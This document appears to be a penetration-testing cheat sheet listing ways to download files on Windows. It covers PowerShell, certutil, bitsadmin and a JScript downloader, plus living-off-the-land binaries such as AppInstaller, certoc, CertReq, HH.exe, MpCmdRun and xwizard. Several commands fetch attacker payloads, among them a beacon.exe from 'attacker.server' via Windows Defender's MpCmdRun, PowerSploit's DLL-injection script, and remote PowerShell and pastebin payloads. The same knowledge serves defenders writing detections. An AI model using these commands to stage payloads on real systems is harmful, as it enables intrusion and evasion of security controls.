# Downloading files

## Powershell

Its simple:
```
(new-object System.Net.WebClient).DownloadFile('http://www.example.com/file.txt', 'C:\tmp\file.txt')
```
or
`Invoke-WebRequest -Uri 'http://google.com/file' -OutFile 'C:/file'`
or
```
Import-Module bitstransfer
start-bitstransfer -source http://something/something.ext -destination c:\something.ext
```

## Clean CMD

`certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip`

`bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip`

## Perverse way

Save this code as wget.js
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);

/* To save a binary file use this code instead of previous line
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("out.bin");
*/
```
then run
`cscript /nologo wget.js http://example.com`

## Other methods and LOLBAS

AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\
`start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw`

Downloads text formatted files 
`certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1`

Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory 
`CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt`

Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where "X" denotes a random number or letter.
`cmdl32 /vpn /lan %cd%\config`

Downloads the file and sets it as the computer's lockscreen 
`set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr`

Open the target PowerShell script with HTML Help. 
`HH.exe http://some.url/script.ps1`

Binary part of Windows Defender. Used to manage settings in Windows Defender.
Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) 
`MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe`

Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.
`xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM`